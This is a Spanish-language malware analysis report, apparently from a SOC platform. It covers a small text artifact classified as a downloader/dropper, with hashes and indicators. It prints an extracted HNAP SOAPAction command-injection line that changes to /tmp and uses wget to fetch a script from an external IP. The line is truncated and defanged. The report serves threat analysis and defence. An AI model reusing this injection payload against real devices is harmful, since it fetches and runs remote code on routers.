# 🧬 Payload Analysis

`ba1f595900bbf7115f1fe644a548f96bcf0cd5c1e14ab24258401bee0951a2f0`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:45:11+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `ba1f595900bbf7115f1fe644a548f96bcf0cd5c1e14ab24258401bee0951a2f0`
- **MD5:** `db1c2a430fcb791af4f5ea7c99a7de6b`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 368 B |
| Entropía | 5.33 |
| Strings | 8 |

## 🧠 Comportamiento observado

1. **Descarga remota**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
SOAPAction: "hxxp://purenetworks[.]com/HNAP1/GetDeviceSettings/`cd && cd tmp && export PATH=$PATH:. && cd /tmp;wget http:/
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 190.179.168.XXX | static_analysis |
| ip | 94.156.152.XXX | static_analysis |
| url | hxxp://94.156.152.XXX/a/wget.sh;chmod | strings |
| url | hxxp://purenetworks[.]com/HNAP1/GetDeviceSettings/ | strings |
| hash | ba1f595900bbf7115f1fe644a548f96bcf0cd5c1e14ab24258401bee0951a2f0 | static_analysis |
| command | SOAPAction: "hxxp://purenetworks[.]com/HNAP1/GetDeviceSettings/`cd && cd tmp && export PATH=$PATH:. && cd /tmp;wget http:/ | strings |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
